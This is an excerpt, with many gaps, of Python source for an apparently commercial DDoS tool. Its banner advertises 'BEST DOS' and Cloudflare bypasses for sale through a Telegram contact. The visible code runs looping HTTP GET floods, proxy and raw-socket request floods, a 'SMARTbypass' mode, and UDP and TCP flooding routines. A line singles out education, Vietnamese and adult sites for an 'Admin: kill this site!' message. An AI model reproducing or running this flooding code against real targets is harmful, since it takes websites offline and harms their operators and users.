...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ~ panel")
    print('''

     _____      - telegram: msvcp   Selling Bypass JS/UAM/DDG/ -
    |  __ \         
 (_)| |  | |        SELL   SELL   SELL   SELL   SELL   SELL   SELL
    | |  | |
    | |__| |            SELL   SELL   SELL   SELL   SELL   SELL
 (_)|_____/ 
                  ========================================================
                     BEST DOS! - STRONG PANEL
                  ===== Version: [ Selling ]''')                  
    try:
...
def start_url():
    ...
    try:
        ...
        print("[!] Incorrectly, repeat attempt [!]")
        start_url()
    logo()
    try:
...
""")
    ...
    if choice_mode == "0":
        ...
        filenam2 = "SMARTbypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "1") or (method_pass_cf == "2"):
            print("[!] Selected Method Bypass Smart v1")
            method_pass_cf = "1"
        else:
            print("[!] Selected Method Bypass Smart v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
...
def begin():
    ...
    if choice6 == "":
        #webbrowser.open("https://teleg.run/msvcp", new=0, autoraise=True)
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[+] Admin: kill this site!")
            sleep(3)
        attack()
        print()
    else:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[log] Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[!] vk.cc/agfXtH | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[log] Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[log] Socket @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[log] Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] vk.cc/ataeh6 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[log] SMARTbypass @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
...
def udpflood():
    ...
    while True:
        ...
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[log] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[log] TCP Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
